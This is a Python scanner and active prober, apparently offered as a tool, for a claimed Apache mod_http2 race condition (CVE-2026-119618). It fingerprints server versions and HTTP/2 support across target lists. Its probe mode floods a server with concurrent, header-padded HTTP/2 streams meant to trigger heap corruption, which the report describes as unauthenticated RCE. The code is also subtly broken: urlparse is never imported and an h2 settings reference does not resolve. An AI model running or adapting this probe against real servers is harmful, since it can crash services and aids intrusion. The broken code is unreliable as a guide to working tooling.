#!/usr/bin/env python3
"""
Apache HTTP/2 Race Condition Prober — CVE-2026-119618
Detects and probes Apache mod_http2 heap corruption via concurrent stream racing.

Usage:
    python h2_racer.py --target https://example.com
    python h2_racer.py --targets hosts.txt --threads 10 --output results/
    python h2_racer.py --target https://example.com --probe --streams 100

Modes:
    detect : Fingerprint and detect vulnerable Apache+HTTP/2 (default)
    probe  : Active race condition probing with concurrent streams

For authorized security testing only.
"""

import argparse
import socket
import ssl
import sys
import os
import json
import re
import struct
import time
import threading
from datetime import datetime, timezone
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import h2.connection
    import h2.config
    import h2.events
    HAS_H2 = True
except ImportError:
    HAS_H2 = False


BANNER = """
╔═══════════════════════════════════════════════════════╗
║  H2-Racer — CVE-2026-119618 Prober                    ║
║  Apache mod_http2 Race Condition Detector              ║
╚═══════════════════════════════════════════════════════╝
"""

# Vulnerable Apache versions
VULN_VERSIONS = {
    "min": (2, 4, 55),
    "max": (2, 4, 70),
}

# HTTP/2 connection preface
H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Headers to race with (different Content-Length values to trigger assign_headers race)
RACE_HEADERS_VARIANTS = [
    {":method": "GET", ":path": "/", "content-length": "0"},
    {":method": "GET", ":path": "/", "content-length": "1"},
    {":method": "POST", ":path": "/", "content-length": "0", "transfer-encoding": "chunked"},
    {":method": "GET", ":path": "/index.html", "content-length": "0"},
    {":method": "HEAD", ":path": "/", "content-length": "0"},
]


class H2RaceProber:
    """Prober for CVE-2026-119618 Apache mod_http2 race condition."""

    def __init__(self, timeout=10, verbose=False, verify_ssl=True):
        self.timeout = timeout
        self.verbose = verbose
        self.verify_ssl = verify_ssl
        self.lock = threading.Lock()

    def log(self, msg, level="info"):
        prefix = {"info": "[*]", "success": "[+]", "warning": "[!]",
                  "error": "[-]", "debug": "[D]"}.get(level, "[*]")
        if level == "debug" and not self.verbose:
            return
        with self.lock:
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"{ts} {prefix} {msg}")

    def parse_version(self, version_str):
        """Parse Apache version string to tuple."""
        match = re.search(r'(\d+)\.(\d+)\.(\d+)', version_str)
        if match:
            return tuple(int(x) for x in match.groups())
        return None

    def is_vulnerable_version(self, version_tuple):
        """Check if version is in vulnerable range."""
        if not version_tuple:
            return None
        return VULN_VERSIONS["min"] <= version_tuple <= VULN_VERSIONS["max"]

    def check_http2_support(self, host, port=443):
        """Check if target supports HTTP/2 via ALPN negotiation."""
        try:
            ctx = ssl.create_default_context()
            if not self.verify_ssl:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])

            sock = socket.create_connection((host, port), timeout=self.timeout)
            tls_sock = ctx.wrap_socket(sock, server_hostname=host)

            negotiated = tls_sock.selected_alpn_protocol()
            tls_version = tls_sock.version()
            cipher = tls_sock.cipher()

            tls_sock.close()

            return {
                "h2_supported": negotiated == "h2",
                "alpn_negotiated": negotiated,
                "tls_version": tls_version,
                "cipher": cipher[0] if cipher else None,
            }
        except Exception as e:
            self.log(f"ALPN check failed: {e}", "debug")
            return {"h2_supported": False, "error": str(e)}

    def fingerprint_server(self, url):
        """Fingerprint web server from HTTP headers."""
        if not HAS_REQUESTS:
            return {}

        info = {
            "server": None,
            "apache_version": None,
            "version_tuple": None,
            "modules_detected": [],
            "headers": {},
        }

        try:
            # HTTP/1.1 request for headers
            r = requests.head(url, timeout=self.timeout, allow_redirects=True,
                              verify=self.verify_ssl)

            info["headers"] = dict(r.headers)
            server = r.headers.get("Server", "")
            info["server"] = server

            # Extract Apache version
            apache_match = re.search(r'Apache[/ ]([\d.]+)', server)
            if apache_match:
                ver_str = apache_match.group(1)
                info["apache_version"] = ver_str
                info["version_tuple"] = self.parse_version(ver_str)

            # Check for mod_http2 hints
            if "mod_h2" in server.lower() or "h2" in server.lower():
                info["modules_detected"].append("mod_http2")

            # Try HTTP/2 upgrade header
            try:
                r2 = requests.get(url, timeout=self.timeout, verify=self.verify_ssl,
                                  headers={"Upgrade": "h2c", "Connection": "Upgrade, HTTP2-Settings",
                                           "HTTP2-Settings": ""})
                if r2.status_code == 101:
                    info["h2c_upgrade"] = True
            except Exception:
                pass

        except Exception as e:
            self.log(f"Fingerprint error: {e}", "debug")

        return info

    def probe_race_condition(self, host, port=443, num_streams=50):
        """
        Active probe — send concurrent HTTP/2 streams to trigger race in assign_headers().
        Detects anomalous responses indicating race condition was hit.
        """
        if not HAS_H2:
            self.log("h2 library required for active probing: pip install h2", "error")
            return {"probed": False, "error": "h2 library not installed"}

        results = {
            "probed": True,
            "num_streams": num_streams,
            "responses": [],
            "anomalies": [],
            "race_indicators": [],
        }

        try:
            # TLS + ALPN setup
            ctx = ssl.create_default_context()
            if not self.verify_ssl:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])

            sock = socket.create_connection((host, port), timeout=self.timeout)
            tls_sock = ctx.wrap_socket(sock, server_hostname=host)

            if tls_sock.selected_alpn_protocol() != "h2":
                self.log("HTTP/2 not negotiated via ALPN", "warning")
                tls_sock.close()
                results["error"] = "HTTP/2 not negotiated"
                return results

            # H2 connection setup
            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            # Increase concurrent streams window
            conn.update_settings({
                h2.settings.SettingsFrame.MAX_CONCURRENT_STREAMS: num_streams + 10,
                h2.settings.SettingsFrame.INITIAL_WINDOW_SIZE: 65535 * 2,
            })
            tls_sock.sendall(conn.data_to_send())

            self.log(f"HTTP/2 connection established — sending {num_streams} concurrent streams", "info")

            # Send all streams as fast as possible (racing assign_headers)
            stream_ids = []
            for i in range(num_streams):
                variant = RACE_HEADERS_VARIANTS[i % len(RACE_HEADERS_VARIANTS)]
                headers = [
                    (":method", variant.get(":method", "GET")),
                    (":path", variant.get(":path", "/")),
                    (":scheme", "https"),
                    (":authority", host),
                    ("user-agent", "Mozilla/5.0 H2-Racer/1.0"),
                    ("accept", "*/*"),
                ]
                # Add extra headers to increase race window
                if "content-length" in variant:
                    headers.append(("content-length", variant["content-length"]))
                if "transfer-encoding" in variant:
                    headers.append(("transfer-encoding", variant["transfer-encoding"]))

                # Add padding headers to widen the race window
                for j in range(5):
                    headers.append((f"x-race-{j}", f"value-{i}-{j}" * 10))

                try:
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, headers, end_stream=True)
                    stream_ids.append(stream_id)
                except Exception as e:
                    self.log(f"Stream send error at #{i}: {e}", "debug")
                    break

            # Flush all at once (maximize concurrent processing)
            tls_sock.sendall(conn.data_to_send())

            self.log(f"Sent {len(stream_ids)} streams — collecting responses", "info")

            # Collect responses
            response_data = {}
            deadline = time.time() + self.timeout * 2
            conn_alive = True

            while conn_alive and time.time() < deadline:
                try:
                    tls_sock.settimeout(2)
                    data = tls_sock.recv(65535)
                    if not data:
                        break

                    events = conn.receive_data(data)
                    tls_sock.sendall(conn.data_to_send())

                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            headers_dict = dict(event.headers)
                            stream_id = event.stream_id
                            response_data.setdefault(stream_id, {})["headers"] = headers_dict

                        elif isinstance(event, h2.events.DataReceived):
                            stream_id = event.stream_id
                            response_data.setdefault(stream_id, {})
                            response_data[stream_id].setdefault("body", b"")
                            response_data[stream_id]["body"] += event.data
                            conn.acknowledge_received_data(event.flow_controlled_length, stream_id)

                        elif isinstance(event, h2.events.StreamEnded):
                            pass

                        elif isinstance(event, h2.events.StreamReset):
                            stream_id = event.stream_id
                            response_data.setdefault(stream_id, {})["reset"] = True
                            response_data[stream_id]["error_code"] = event.error_code

                        elif isinstance(event, h2.events.ConnectionTerminated):
                            self.log(f"Connection terminated: error={event.error_code}", "warning")
                            results["race_indicators"].append({
                                "type": "connection_terminated",
                                "error_code": event.error_code,
                                "detail": f"Server killed connection after {len(response_data)} responses",
                            })
                            conn_alive = False
                            break

                except socket.timeout:
                    if len(response_data) >= len(stream_ids):
                        break
                    continue
                except Exception as e:
                    self.log(f"Response collection error: {e}", "debug")
                    break

            tls_sock.close()

            # Analyze responses for race condition indicators
            status_codes = []
            for sid, rdata in response_data.items():
                headers = rdata.get("headers", {})
                status = headers.get(b":status", headers.get(":status", b"0"))
                if isinstance(status, bytes):
                    status = status.decode()
                status_codes.append(int(status) if status.isdigit() else 0)

                body = rdata.get("body", b"")
                body_len = len(body) if body else 0

                response_info = {
                    "stream_id": sid,
                    "status": int(status) if str(status).isdigit() else status,
                    "body_length": body_len,
                    "reset": rdata.get("reset", False),
                    "error_code": rdata.get("error_code"),
                }
                results["responses"].append(response_info)

            # Detect anomalies
            # 1. Mixed status codes (some 200, some 500) = potential race hit
            unique_statuses = set(status_codes)
            if 500 in unique_statuses or 503 in unique_statuses:
                error_count = sum(1 for s in status_codes if s >= 500)
                results["anomalies"].append({
                    "type": "server_errors",
                    "detail": f"{error_count}/{len(status_codes)} responses returned 5xx",
                    "severity": "high" if error_count > 5 else "medium",
                })

            # 2. Connection terminated unexpectedly
            if not conn_alive:
                results["anomalies"].append({
                    "type": "connection_killed",
                    "detail": "Server terminated HTTP/2 connection during stream processing",
                    "severity": "high",
                })

            # 3. Stream resets
            reset_count = sum(1 for r in results["responses"] if r.get("reset"))
            if reset_count > num_streams * 0.3:
                results["anomalies"].append({
                    "type": "mass_stream_reset",
                    "detail": f"{reset_count}/{num_streams} streams were reset",
                    "severity": "medium",
                })

            # 4. Inconsistent body lengths for same path
            body_lengths = [r["body_length"] for r in results["responses"]
                           if r.get("status") == 200]
            if body_lengths and len(set(body_lengths)) > 1:
                results["anomalies"].append({
                    "type": "inconsistent_bodies",
                    "detail": f"Same request returned different body sizes: {set(body_lengths)}",
                    "severity": "high",
                })

            # 5. Missing responses (streams that never completed)
            completed = len(response_data)
            if completed < len(stream_ids) * 0.8:
                results["anomalies"].append({
                    "type": "dropped_streams",
                    "detail": f"Only {completed}/{len(stream_ids)} streams completed",
                    "severity": "medium",
                })

            results["total_responses"] = len(response_data)
            results["total_streams_sent"] = len(stream_ids)
            results["unique_status_codes"] = list(unique_statuses)

        except Exception as e:
            self.log(f"Probe error: {e}", "error")
            results["error"] = str(e)

        return results

    def scan_target(self, target):
        """Full scan of a single target."""
        # Parse URL
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        is_https = parsed.scheme == "https"

        result = {
            "target": target,
            "host": host,
            "port": port,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "fingerprint": {},
            "h2_check": {},
            "vulnerable": False,
            "risk_level": "none",
            "details": [],
        }

        self.log(f"Scanning {target}", "info")

        # Phase 1: Server fingerprint
        fp = self.fingerprint_server(target)
        result["fingerprint"] = fp

        if fp.get("server"):
            self.log(f"Server: {fp['server']}", "info")

        if fp.get("apache_version"):
            is_vuln = self.is_vulnerable_version(fp["version_tuple"])
            if is_vuln:
                self.log(f"Apache {fp['apache_version']} — IN VULNERABLE RANGE", "warning")
                result["details"].append(f"Apache version {fp['apache_version']} is vulnerable")
            elif is_vuln is False:
                self.log(f"Apache {fp['apache_version']} — patched or out of range", "info")
            result["vulnerable_version"] = is_vuln
        elif fp.get("server") and "apache" not in fp["server"].lower():
            self.log(f"Not Apache — {fp['server']}", "info")
            result["status"] = "NOT_APACHE"
            return result

        # Phase 2: HTTP/2 support check
        if is_https:
            h2_check = self.check_http2_support(host, port)
            result["h2_check"] = h2_check

            if h2_check.get("h2_supported"):
                self.log(f"HTTP/2 supported via ALPN", "warning")
                result["details"].append("HTTP/2 enabled via ALPN negotiation")
            else:
                self.log(f"HTTP/2 not supported — not vulnerable to this CVE", "info")
                result["status"] = "NO_HTTP2"
                return result

        # Determine overall risk
        has_vuln_ver = result.get("vulnerable_version", False)
        has_h2 = result.get("h2_check", {}).get("h2_supported", False)

        if has_vuln_ver and has_h2:
            result["vulnerable"] = True
            result["risk_level"] = "critical"
            result["status"] = "VULNERABLE"
            self.log(f"VULNERABLE — Apache {fp.get('apache_version')} with HTTP/2 enabled", "success")
        elif has_h2 and fp.get("server") and "apache" in fp["server"].lower():
            result["risk_level"] = "medium"
            result["status"] = "POSSIBLE"
            self.log(f"Possibly vulnerable — Apache with H2, version unclear", "warning")
        else:
            result["status"] = "NOT_VULNERABLE"

        return result

    def scan_targets(self, targets, threads=10):
        results = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.scan_target, t.strip()): t.strip()
                       for t in targets if t.strip()}
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as e:
                    self.log(f"Error: {e}", "error")
        return results


def generate_report(results, output_dir):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    json_path = output_dir / f"h2_racer_scan_{ts}.json"
    with open(json_path, "w") as f:
        json.dump(results, f, indent=2, default=str)

    md_path = output_dir / f"h2_racer_report_{ts}.md"
    vuln = [r for r in results if r.get("vulnerable")]

    with open(md_path, "w") as f:
        f.write("# CVE-2026-119618 — Apache mod_http2 Race Condition Report\n\n")
        f.write(f"**Date:** {datetime.now(timezone.utc).isoformat()}\n")
        f.write(f"**Targets:** {len(results)} | **Vulnerable:** {len(vuln)}\n\n")

        if vuln:
            f.write("## Vulnerable Targets\n\n")
            f.write("| Target | Apache Version | HTTP/2 | Risk |\n")
            f.write("|---|---|---|---|\n")
            for r in vuln:
                ver = r.get("fingerprint", {}).get("apache_version", "?")
                h2 = "✅" if r.get("h2_check", {}).get("h2_supported") else "❌"
                f.write(f"| {r['target']} | {ver} | {h2} | {r['risk_level']} |\n")

        f.write("\n## Technical Details\n\n")
        f.write("Race condition in `assign_headers()` (`modules/http2/h2_request.c`)\n")
        f.write("allows heap corruption via concurrent HTTP/2 stream multiplexing.\n")
        f.write("Unauthenticated RCE as httpd process user.\n")

    print(f"\n[+] Report: {md_path}")
    print(f"[+] Evidence: {json_path}")


def main():
    parser = argparse.ArgumentParser(
        description="H2-Racer — CVE-2026-119618 Apache mod_http2 Race Condition Prober",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", help="Single target URL")
    target_group.add_argument("--targets", help="File with target URLs")

    parser.add_argument("--probe", action="store_true",
                        help="Active race condition probing (sends concurrent H2 streams)")
    parser.add_argument("--streams", type=int, default=50,
                        help="Number of concurrent streams for probe mode (default: 50)")
    parser.add_argument("--threads", type=int, default=10, help="Scan threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout (default: 10)")
    parser.add_argument("--output", default="./reports", help="Output directory")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Skip SSL verification")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if not HAS_REQUESTS:
        print("[-] requests required: pip install requests")
        sys.exit(1)

    print(BANNER)

    prober = H2RaceProber(
        timeout=args.timeout,
        verbose=args.verbose,
        verify_ssl=not args.no_verify_ssl,
    )

    if args.target:
        targets = [args.target]
    else:
        with open(args.targets) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    results = prober.scan_targets(targets, args.threads)

    # Active probe on vulnerable targets
    if args.probe:
        for result in results:
            if result.get("vulnerable") or result.get("risk_level") in ["critical", "medium"]:
                parsed = urlparse(result["target"])
                host = parsed.hostname
                port = parsed.port or 443
                print(f"\n[*] Active probing {host}:{port} with {args.streams} streams...")
                probe_result = prober.probe_race_condition(host, port, args.streams)
                result["probe_results"] = probe_result

                if probe_result.get("anomalies"):
                    print(f"[!] Anomalies detected:")
                    for a in probe_result["anomalies"]:
                        print(f"    [{a['severity'].upper()}] {a['type']}: {a['detail']}")

    generate_report(results, args.output)

    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    print(f"\n{'='*60}")
    print(f"[*] Scanned: {len(results)} | Vulnerable: {vuln_count}")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
